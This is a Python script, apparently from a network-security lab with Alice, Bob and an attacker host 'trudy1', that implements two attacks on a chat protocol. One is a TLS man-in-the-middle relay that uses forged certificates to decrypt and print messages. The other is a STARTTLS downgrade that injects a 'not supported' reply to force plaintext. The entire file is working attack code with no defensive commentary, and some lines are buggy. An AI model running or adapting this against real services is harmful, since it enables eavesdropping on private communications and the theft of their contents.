import socket
import sys
import ssl

def man_in_the_middle(host1,host2):
    port = 5006

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    print('Socket created')

    try:
        my_ip = socket.gethostbyname("trudy1")
    except socket.gaierror:
        print('Could not resove hostname')
        sys.exit()

    # Bind the specified port to the socket, capture all incoming data
    try:
        s.bind((my_ip, port))
    except socket.error:
        print('Bind failed. Error:')
        sys.exit()

    # listen for any incoming connections over this port, 10 means only 10 connections are allowed to be waiting
    s.listen(1)
    print('Socket now listening')

    conn, addr = s.accept()
    data = conn.recv(50)

    try:
        remote_ip_bob = socket.gethostbyname(host2)
    except socket.gaierror:
        print('Could not resove hostname')
        sys.exit()

    try:
        bob = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    except socket.error:
        print('Error making the socket')

    bob.connect((remote_ip_bob, port))
    bob.send(data)
    data = bob.recv(50)
    conn.send(data)

    data = conn.recv(50)
    bob.send(data)
    data = bob.recv(50)
    conn.send(data)

    conn = ssl.wrap_socket(conn, keyfile="/root/fake-bob-private-key.pem", certfile="/root/fakebob.crt",
                           ca_certs="/root/root.crt", server_side=True, cert_reqs=ssl.CERT_REQUIRED,
                           ssl_version=ssl.PROTOCOL_TLS)
    data = conn.recv(100)
    data = data.decode()
    print("Message from alice " + data)
    bob = ssl.wrap_socket(bob, keyfile="/root/fake-alice-private-key.pem", certfile="/root/fakealice.crt",
                          server_side=False, ca_certs="/root/root.crt", cert_reqs=ssl.CERT_REQUIRED,
                          ssl_version=ssl.PROTOCOL_TLS)
    bob.send(data.encode())

    while (1):
        data = bob.recv(100)
        data = data.decode()
        print("message from bob :" + data)
        if (data == "chat_close"):
            conn.send(data.decode())
            conn.close()
            bob.close()
            s.close()
            break
        conn.send(data.encode())
        data = conn.recv(100)
        data = data.decode()
        print("message from alice :" + data)
        if (data == "chat_close"):
            bob.send(data.encode())
            conn.close()
            bob.close()
            s.close()
            break
        bob.send(data.encode())

def downgrade(host1,host2):
    port = 5006

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    print('Socket created')

    try:
        my_ip = socket.gethostbyname("trudy1")
    except socket.gaierror:
        print('Could not resove hostname')
        sys.exit()

    # Bind the specified port to the socket, capture all incoming data
    try:
        s.bind((my_ip, port))
    except socket.error:
        print('Bind failed. Error:')
        sys.exit()

    # listen for any incoming connections over this port, 10 means only 10 connections are allowed to be waiting
    s.listen(1)
    print('Socket now listening')

    conn, addr = s.accept()
    data = conn.recv(50)

    try:
        remote_ip_bob = socket.gethostbyname(host2)
    except socket.gaierror:
        print('Could not resove hostname')
        sys.exit()

    try:
        bob = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    except socket.error:
        print('Error making the socket')

    bob.connect((remote_ip_bob, port))
    bob.send(data)
    data = bob.recv(50)
    conn.send(data)

    data = conn.recv(50)
    conn.send("chat_STARTTLS_NOT_SUPPORTED".encode())

    while (1):
        data = conn.recv(100)
        data = data.decode()
        if (data == "chat_close"):
            bob.send(data.encode())
            conn.close()
            bob.close()
            s.close()
            break
        else:
            bob.send(data.encode())
            data = bob.recv(100)
            data = data.decode()
            if (data == "chat_close"):
                conn.send(data.encode())
                bob.close()
                conn.close()
                s.close()
                break
            conn.send(data.encode())

choice = sys.argv[1]
if(choice == "-d"):
    downgrade(sys.argv[2],sys.argv[3])
else :
    man_in_the_middle(sys.argv[2],sys.argv[3])
